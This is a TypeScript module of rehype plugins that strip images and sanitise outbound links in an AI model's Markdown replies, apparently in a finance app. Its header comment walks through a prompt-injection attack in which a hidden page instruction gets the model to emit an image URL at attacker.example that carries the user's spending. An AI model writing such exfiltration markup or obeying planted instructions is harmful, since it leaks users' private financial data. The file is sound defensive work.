// Rendering rules for the assistant's Markdown that protect the user's data.
// Kept free of framework imports so it can be unit-tested with `node --test`.
//
// Why images are never rendered: a browser loads an <img> as soon as it appears, with no click.
// The assistant can read web pages (web search and deep research) and can see what the user shares
// (transactions, plan, holdings). A page with hidden instructions could get the model to write
// ![](https://attacker.example/pixel?data=<the user's spending>), and rendering it would send that
// data to the attacker. This is prompt injection leading to data exfiltration (OWASP Top 10 for
// LLM Applications 2025, LLM01 and LLM02). The app's own charts and tables are fenced ```chart /
// ```table blocks, not images, so nothing the app produces is lost.
//
// Links are the same channel behind one click, so they follow rules too (rehypeSafeLinks):
// - Links on this site ("/learn/...", "#...") stay as they are.
// - A link to another site keeps only where it goes: its query string ("?d=<the user's income>"),
//   fragment and any user:password part are dropped, which is where a planted link would carry
//   data. Real pages rarely need them; the trade-off is that the odd cited page that does opens
//   without them. Its site is also shown next to the link text in chat-markdown.tsx
//   (lib/chat/links.ts), so "IRS.gov" pointing somewhere else can't pass for the real thing.
// - Everything else (mailto:, tel:, protocol-relative "//host", other schemes) becomes plain
//   text: a mail link can carry a whole message body, and replies never need one.
// What is left is a path on another site, which could still spell out a figure. That needs the
// model to follow a planted instruction and the reader to click a link marked with a site they
// don't know, so it's accepted rather than dropping outside links altogether.

type HastNode = {
  type: string
  tagName?: string
  value?: string
  properties?: Record<string, unknown>
  children?: HastNode[]
}

/** Text shown where an image was: its alt text in brackets, or nothing when it has none. */
export function imagePlaceholder(alt: unknown): string {
  const text = typeof alt === "string" ? alt.trim().slice(0, 120) : ""
  return text ? `[image: ${text}]` : ""
}

function replaceImages(node: HastNode) {
  if (!node.children) return
  node.children = node.children.map((child) => {
    if (child.type === "element" && child.tagName === "img") {
      return { type: "text", value: imagePlaceholder(child.properties?.alt) }
    }
    replaceImages(child)
    return child
  })
}

/** Rehype plugin: replaces every <img> with its alt text, so no reply can make the browser fetch a URL. */
export function rehypeNoImages() {
  return (tree: HastNode) => {
    replaceImages(tree)
  }
}

// Control characters, whitespace and backslashes never belong in a real link, and browsers read
// some of them in surprising ways. Hrefs reach here percent-encoded, so a legitimate one has none.
function hasUnsafeCharacters(href: string) {
  for (const char of href) {
    const code = char.charCodeAt(0)
    if (code <= 32 || code === 127 || char === "\\") return true
  }
  return false
}

/**
 * The address a link in a reply may open, or null for a link that should become plain text.
 * Same-site paths and fragments are kept; another site's address loses its query string, fragment
 * and credentials.
 */
export function safeLinkHref(href: unknown): string | null {
  if (typeof href !== "string" || href === "" || hasUnsafeCharacters(href)) return null
  if (href.startsWith("#") || (href.startsWith("/") && !href.startsWith("//"))) return href
  let url: URL
  try {
    // Absolute addresses only: the model has no reason to write any other relative form.
    url = new URL(href)
  } catch {
    return null
  }
  if (url.protocol !== "https:" && url.protocol !== "http:") return null
  url.username = ""
  url.password = ""
  url.search = ""
  url.hash = ""
  return url.href
}

function rewriteLinks(node: HastNode) {
  for (const child of node.children ?? []) {
    if (child.type === "element" && child.tagName === "a") {
      const href = safeLinkHref(child.properties?.href)
      if (href === null) {
        // The words stay, the link goes.
        child.tagName = "span"
        child.properties = {}
      } else {
        child.properties = { ...child.properties, href }
      }
    }
    rewriteLinks(child)
  }
}

/** Rehype plugin: applies safeLinkHref to every link in a reply. */
export function rehypeSafeLinks() {
  return (tree: HastNode) => {
    rewriteLinks(tree)
  }
}
